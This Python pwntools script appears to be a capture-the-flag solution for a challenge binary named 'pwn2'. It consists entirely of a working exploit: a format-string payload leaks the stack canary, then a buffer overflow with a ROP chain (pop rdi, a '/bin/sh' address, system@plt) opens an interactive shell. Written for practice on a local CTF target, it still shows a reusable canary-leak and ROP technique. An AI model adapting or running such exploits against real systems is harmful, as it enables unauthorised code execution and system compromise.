#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level = 'debug')

p = process('./pwn2')
elf = ELF('./pwn2')

win_addr = 0x00400a7c
sh_addr = 0x400e14
system_plt = elf.plt['system']
pop_rdi_ret = 0x400d03
fmt_payload = '%39$p'
password = 'CSCG{THIS_IS_TEST_FLAG}'
payload = 'Expelliarmus\x00'
payload += 'a' * (0x110 - 0x8 - 13)

#leak canary
p.sendlineafter('Enter the password of stage 1:', password)
p.sendlineafter('Enter your witch name:', fmt_payload)
p.recvuntil('└───────────────────────┘\n')
canary = eval(p.recvuntil('00'))
print (hex(canary))
pause()

#overflow
payload += p64(canary)
payload += p64(0xdeadbeaf)
payload += p64(pop_rdi_ret)
payload += p64(sh_addr)
payload += p64(system_plt)
# payload = 'Expelliarmus\x00'
p.sendlineafter('enter your magic spell:\n', payload)
# gdb.attach(p, '\n')
# pause()
p.interactive()